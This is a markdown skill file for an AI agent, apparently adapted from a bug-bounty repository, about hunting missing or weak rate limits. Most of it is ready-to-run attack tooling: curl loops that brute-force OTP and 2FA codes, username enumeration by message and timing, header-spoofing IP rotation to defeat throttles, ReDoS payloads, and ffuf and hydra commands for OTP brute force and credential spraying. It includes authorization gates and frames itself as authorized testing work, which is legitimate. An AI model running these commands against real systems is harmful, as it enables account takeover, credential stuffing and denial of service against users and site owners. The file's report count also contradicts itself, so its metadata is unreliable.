---
name: hunt-brute-force
description: Hunt Missing/Weak Rate Limiting
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: public_research
report_count: 6
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

# HUNT-BRUTE-FORCE — Rate Limiting / Brute Force / Enumeration

> Grounding note: this skill is built from published technique classes, not from a
> curated set of named HackerOne reports. `report_count` is intentionally `0` — do
> not cite an exact payout or report ID you cannot verify. Where a public case is
> well-documented (e.g. Laxman Muthiyah's Instagram password-reset OTP race/rotation
> research, 2019–2021), it is named below as a *technique reference*, not a payout claim.

## Crown Jewel Targets

OTP brute force (6-digit = 1,000,000 combinations) with no effective rate limit = Critical ATO bypass.

**Highest-value chains:**
- **OTP / 2FA brute → MFA bypass → ATO** — no effective rate limit on `/verify-otp`, full 000000–999999 keyspace reachable
- **Password-reset token brute** — short/predictable/non-expiring tokens + no rate limit → ATO (the Instagram 2019 case combined a 6-digit reset code, no rate limit per request-source, and IP rotation to make 10^6 tractable)
- **Username/email enumeration → targeted credential stuffing** — valid/invalid distinguishable by response string, status code, or timing, then sprayed with breach corpora
- **Coupon / gift-card / referral code brute** — no rate limit on code validation → financial impact
- **ReDoS** — attacker-controlled input hits a catastrophic-backtracking regex → CPU exhaustion → DoS

---

## Autonomous Testing Priority

**Work within your turn budget — prioritize signal over volume.**

You cannot brute-force millions of combinations in automated testing. Focus on two things: (1) credential spraying with the most likely candidates, and (2) detecting whether rate limiting exists at all.

**Strategy:**
1. Identify the login endpoint and the expected parameter names (username/email, password).
2. Try weak/default credentials likely for the target context — default admin credentials for the app's stack, simple passwords for test environments, credentials visible elsewhere on the app (e.g. usernames exposed in profiles, default passwords in documentation).
3. After 3-5 failed attempts, check for rate-limit signals (429 status, "too many attempts" message, CAPTCHA appearance, account lockout message). Absence of these = rate limiting is missing = vulnerability.
4. Use form-encoding for traditional login forms, JSON for REST API login endpoints.

**What to look for as success:**
- Session token or JWT in the response body or Set-Cookie header
- Redirect to authenticated dashboard
- Response body that differs from the failed-login baseline

**Username enumeration (separate finding):** Try a known-valid username vs a random one. If the error message differs ("Wrong password" vs "User not found") or response time differs → user enumeration vulnerability, even without a successful login.

---

## CRITICAL: Four rate-limit states — do not collapse them

A `200`/`401` with no `429` does **not** mean "no rate limiting". A rate-limiting
skill that only checks for `429`/lockout produces false negatives. Classify the
defense BEFORE concluding, by sending a burst of ~50 requests and watching the
*full* response (status, body, headers, latency, and downstream success):

| State | Signal | Brute still feasible? |
|-------|--------|-----------------------|
| **Hard account lockout** | account disabled after N fails; later *correct* creds also fail | No (but lockout itself can be a DoS finding) |
| **Soft IP throttle** | `429` / increasing latency keyed on source IP only | Yes — bypass via header/IP rotation (Phase 4) |
| **CAPTCHA injection** | `200` but body switches to a CAPTCHA challenge after N | Maybe — check if the verify endpoint enforces it server-side or if the API path skips it |
| **Silent shadow-throttle** | `200`/`401` returned for every request, but submissions are *dropped* — the genuinely-correct OTP/password stops being accepted, or responses become canned | **This is the trap.** A naive loop sees "all 200, no 429" and reports "no rate limit" — false. |

**Shadow-throttle detector** — inject a known-good value at a known position and
confirm it still works under load:
```bash
# Seed: position 500 in the brute set is the REAL OTP for your own test account.
# If the loop reaches 500 and the correct code no longer authenticates,
# the endpoint is silently throttling/dropping — NOT unprotected.
KNOWN_GOOD="123456"   # the actual current OTP for YOUR test account
for n in $(seq 0 600); do
  CODE=$([ "$n" = "500" ] && echo "$KNOWN_GOOD" || printf "%06d" "$n")
  CODE_RESP=$(curl -s -o /tmp/bf_body -w "%{http_code} %{time_total}" \
    -X POST "https://$TARGET/api/verify-otp" \
    -H "Content-Type: application/json" -H "Cookie: $SESSION_COOKIE" \
    -d "{\"otp\":\"$CODE\"}")
  echo "$n $CODE $CODE_RESP $(wc -c </tmp/bf_body)"
done
# Three columns to watch: status, time_total, body size.
# Rising time_total or a body-size change with status unchanged = shadow throttle.
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Login Rate Limit Test (classify, don't just count 429s)
```bash
# Send a burst and log status + latency + body length for EACH attempt.
for i in $(seq 1 50); do
  read CODE TIME < <(curl -s -o /tmp/bf_l -w "%{http_code} %{time_total}\n" \
    -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"test@$TARGET\",\"password\":\"wrong$i\"}")
  echo "Attempt $i: status=$CODE time=${TIME}s len=$(wc -c </tmp/bf_l)"
  sleep 0.1
done
# Then CLASSIFY against the 4-state table above. Watch for:
#   - status flips to 429 / 403  → soft throttle or lockout
#   - body grows / CAPTCHA token appears → CAPTCHA injection
#   - latency climbs while status stays 401 → shadow throttle
#   - genuinely nothing changes across all 50 → candidate "no rate limit" (confirm w/ Phase 2 seed)
```

### Phase 2 — OTP / 2FA Brute Force
```bash
# PRE-REQUISITE: a valid session that is pending OTP verification (your own test account).
SESSION_COOKIE="pre-auth-session-after-first-factor"

# ---- 2a. PoC probe: send 101 codes (seq 0..100 is INCLUSIVE = 101 values) ----
# This ONLY proves the endpoint accepts repeated attempts without 429/lockout.
# It does NOT prove the full 10^6 keyspace is brute-forcible — see 2b.
for CODE in $(seq -f "%06g" 0 100); do
  RESP=$(curl -s -X POST "https://$TARGET/api/verify-otp" \
    -H "Content-Type: application/json" -H "Cookie: $SESSION_COOKIE" \
    -d "{\"otp\":\"$CODE\"}" -o /dev/null -w "%{http_code}")
  echo "$CODE: $RESP"
  [ "$RESP" = "429" ] && { echo "Rate limit at $CODE"; break; }
done
# 101 attempts with no 429/lockout → endpoint is a candidate. NOW run the shadow-throttle
# seed test (above) before claiming "no rate limit". A clean probe is necessary, not sufficient.

# ---- 2b. Full-keyspace impact proof (only with explicit authorization + your own account) ----
# Severity rests on 10^6 being REACHABLE, not on 101 codes. Demonstrate tractability:
#   - keyspace = 10^6 ; observed throughput from 2a (req/s) ; expected hit at ~half keyspace.
#   - e.g. 50 req/s sustained → ~10^6 / 50 ≈ 5.5 hours worst case, ~2.8h expected. That IS the impact.
#   - If a code rotates every T seconds, the real bound is (req/s * T) attempts per window.
#     Brute is only viable if (throughput * code_lifetime) approaches the keyspace, OR if the
#     code does NOT rotate / reset is unlimited (the Instagram-2019 class).
# Report the math; do NOT actually exhaust 10^6 against a third party.
```

### Phase 3 — Username / Email Enumeration (string AND status AND timing)
```bash
VALID_USER="known-user@$TARGET"
INVALID_USER="definitely-not-real-xyz123@$TARGET"

# String + status diff
for U in "$VALID_USER" "$INVALID_USER"; do
  curl -s -o /tmp/bf_e -w "[$U] status=%{http_code} time=%{time_total}s len=%{size_download}\n" \
    -X POST "https://$TARGET/api/login" -H "Content-Type: application/json" \
    -d "{\"email\":\"$U\",\"password\":\"wrongpassword\"}"
done
diff <(curl -s -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
        -d "{\"email\":\"$VALID_USER\",\"password\":\"wrong\"}") \
     <(curl -s -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
        -d "{\"email\":\"$INVALID_USER\",\"password\":\"wrong\"}")
# Different message/status/len → enumeration.

# Timing oracle (valid users hash the password, invalid users short-circuit → measurable delta).
# Sample MANY times and compare medians — a single request is noise, not signal.
echo "VALID timings:";   for i in $(seq 1 30); do curl -s -o /dev/null -w "%{time_total}\n" \
  -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$VALID_USER\",\"password\":\"wrong\"}"; done | sort -n | awk '{a[NR]=$1}END{print a[int(NR/2)]}'
echo "INVALID timings:"; for i in $(seq 1 30); do curl -s -o /dev/null -w "%{time_total}\n" \
  -X POST "https://$TARGET/api/login" -H 'Content-Type: application/json' \
  -d "{\"email\":\"$INVALID_USER\",\"password\":\"wrong\"}"; done | sort -n | awk '{a[NR]=$1}END{print a[int(NR/2)]}'
# A reproducible median delta (e.g. valid ~180ms vs invalid ~40ms) is a timing-based enum finding.

# Reset + registration enumeration
curl -s -X POST "https://$TARGET/forgot-password" -d "email=$VALID_USER"   | grep -i "sent\|exist\|not found\|registered"
curl -s -X POST "https://$TARGET/forgot-password" -d "email=$INVALID_USER" | grep -i "sent\|exist\|not found\|registered"
curl -s -X POST "https://$TARGET/api/register"   -d "email=$VALID_USER"    | grep -i "exist\|taken\|already"
```

### Phase 3b — Unthrottled registration (mass account creation)
An unrate-limited signup endpoint is an abuse finding on its own, not just an enumeration oracle: burst `*/signup`/`*/register` (rotate email + source per request) and confirm N accounts are actually created with no 429/CAPTCHA/lockout → automated mass-account creation (spam, promo/referral abuse, resource exhaustion). Low–Medium standalone; higher when it chains to a paid/limited resource. Disclosed: reports/2915502.

### Phase 4 — IP / Source Rotation Bypass
```bash
# Per-IP limits are bypassable when the app trusts a client-controlled source header.
# Rotate the header EVERY request; if the 429 you hit in Phase 1 disappears → broken limit.
HEADERS=( "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "X-Client-IP" \
          "X-Remote-IP" "X-Forwarded" "Forwarded-For" "CF-Connecting-IP" "True-Client-IP" )
for i in $(seq 1 60); do
  RAND_IP="$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1).$(shuf -i 1-254 -n1)"
  ARGS=(); for h in "${HEADERS[@]}"; do ARGS+=(-H "$h: $RAND_IP"); done
  RESP=$(curl -s "${ARGS[@]}" -X POST "https://$TARGET/api/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"test@$TARGET\",\"password\":\"wrong$i\"}" -o /dev/null -w "%{http_code}")
  echo "Attempt $i (IP $RAND_IP): $RESP"
done
# Also try: multiple comma-joined XFF values ("1.2.3.4, 5.6.7.8"), and appending your real IP
# AFTER a spoofed one — some parsers take first, some last.
# CONFIRM the bypass: re-run Phase 1 WITHOUT rotation to show the 429 returns. The delta is the proof.
```

### Phase 5 — Token Entropy (measure it, don't eyeball it)
```bash
# Collect reset/session/OTP tokens for YOUR OWN test account, then quantify entropy.
for i in $(seq 1 20); do
  curl -s -X POST "https://$TARGET/forgot-password" -d "email=your-test@email.com"
  # Extract token from the email/link and append to tokens.txt
  sleep 2
done

# 1) Shannon entropy / compressibility — low entropy = predictable:
ent tokens.txt 2>/dev/null || \
  python3 -c "import sys,math,collections;d=open('tokens.txt').read();c=collections.Counter(d);n=len(d);\
print('bits/char =', -sum(v/n*math.log2(v/n) for v in c.values()))"

# 2) If tokens are hex/base64, decode and look for structure (timestamp, counter, PID):
while read t; do echo -n "$t -> "; echo -n "$t" | xxd -r -p 2>/dev/null | xxd | head -1; done < tokens.txt

# 3) Sequential / time-correlated test — sort and diff consecutive numeric tokens:
sort -n tokens.txt | awk 'NR>1{print $1-prev} {prev=$1}'   # constant/small delta = counter-based

# 4) DEFINITIVE tool: pipe ~10k tokens through Burp Sequencer (Live capture on the reset
#    response) — it runs FIPS/NIST randomness tests and reports effective bits of entropy.
#    < ~64 effective bits on a security token is a finding; the brute-window math follows.
```

### Phase 6 — ReDoS Detection
```bash
# Hit input-validation / search endpoints with catastrophic-backtracking payloads.
# Classic evil-regex triggers (nested quantifier / overlapping alternation):
for LEN in 5 10 15 20 25 30; do
  INPUT=$(python3 -c "print('a'*$LEN + '!')")              # for (a+)+$  /  (a|a)*$ style regex
  T=$(curl -s -o /dev/null -w "%{time_total}" "https://$TARGET/search?q=$INPUT")
  echo "len=$LEN -> ${T}s"
done
# Other payload shapes to try by field: email regex → "a@"+"a"*N ; URL regex → "http://"+"a"*N
# DOUBLING latency per +5 chars (super-linear) = ReDoS. Linear growth = just a slow endpoint, NOT a bug.
# Confirm with a control: send the same byte-length of a BENIGN string; if it returns fast, the
# blow-up is regex-driven, not size-driven.
```

---

## Automation
```bash
# ---- ffuf: OTP brute ----
# PoC probe (101 codes) — proves acceptance, NOT full keyspace. Note the inclusive seq.
ffuf -u "https://$TARGET/api/verify-otp" -X POST \
  -H "Content-Type: application/json" -H "Cookie: session=SESSION" \
  -d '{"otp": "FUZZ"}' \
  -w <(seq -f "%06g" 0 100) \
  -mc all -ac \
  -rate 50            # cap throughput so YOU can read the rate-limit response, not DoS the target

# FULL keyspace (authorized + your own account only) — generate all 10^6 codes:
#   seq -f "%06g" 0 999999 > /tmp/otp_full.txt   (then -w /tmp/otp_full.txt)
# Use -mc all + -ac so ffuf auto-calibrates and you SEE 429/403/CAPTCHA responses instead of
# filtering them out. -mc 200 alone hides throttling — never brute with -mc 200 only.
# Add -p 0.1 jitter and watch the Errors/RateLimited counters; stop if the success oracle stops firing.

# ---- hydra: login spray ----
hydra -l admin@target.com -P ~/wordlists/top-1000.txt "$TARGET" \
  http-post-form "/api/login:email=^USER^&password=^PASS^:Invalid" -t 4

# ---- nuclei: rate-limit / default-cred templates ----
nuclei -u "https://$TARGET" -t http/fuzzing/ -t http/default-logins/ -severity medium,high,critical
```

---

## Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| No effective rate limit on OTP (full 10^6 reachable) | MFA bypass → ATO | Critical |
| Password-reset code brute + IP rotation | Reset → ATO (Instagram-2019 class) | Critical |
| No rate limit on login + enumeration | Credential stuffing with breach corpus | High |
| IP bypass via X-Forwarded-For et al. | Every per-IP limit on the app defeated | High |
| Predictable / low-entropy reset token | Token guess within validity window → ATO | High |
| ReDoS on a public input field | Single-request CPU exhaustion → DoS | Medium–High |
| Hard lockout triggerable by attacker | Targeted account DoS (lock victim out) | Medium |

---

## Validation — false-positive discipline

Before writing the report, each must hold:

- **OTP/login "no rate limit"**: confirmed against ALL FOUR states — not just absence of `429`.
  Shadow-throttle seed test passed (the known-good value still authenticates under burst load).
  Latency and body-size were monitored, not only status code.
- **Full-keyspace claim**: severity is justified by the *reachability math* (throughput × code-lifetime
  vs 10^6), not by a 101-code probe. State the numbers in the report.
- **Enumeration**: difference is reproducible across ≥20 samples and is a *server-state* difference
  (valid vs invalid user), not a server-policy artifact (e.g. a generic "if this email exists we sent…"
  message is NOT enumeration). For timing, compare medians of many samples, never single requests.
- **IP-rotation bypass**: proven by toggling rotation off and showing the `429` returns. The delta IS
  the proof; one fast run alone is not.
- **Token entropy**: backed by an actual measurement (Burp Sequencer effective-bits, `ent`, or a
  demonstrated counter/timestamp structure), not "looks short".
- **ReDoS**: super-linear (doubling) latency growth with a benign-control comparison; linear ≠ ReDoS.
- **Scope/impact**: did you reach a real outcome (authenticated session, leaked account list, DoS)?
  A rate-limit gap with no reachable impact is informational, not Medium.

**Severity:**
- Effective brute of OTP/MFA/reset-code → demonstrated ATO path: **Critical**
- No login rate limit + working credential-stuffing/IP-bypass: **High**
- Predictable security token (measured low entropy): **High**
- Username/email enumeration alone: **Low–Medium**
- ReDoS with reproducible meaningful server lag: **Medium–High**
- Attacker-triggerable hard lockout (account DoS): **Medium**

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
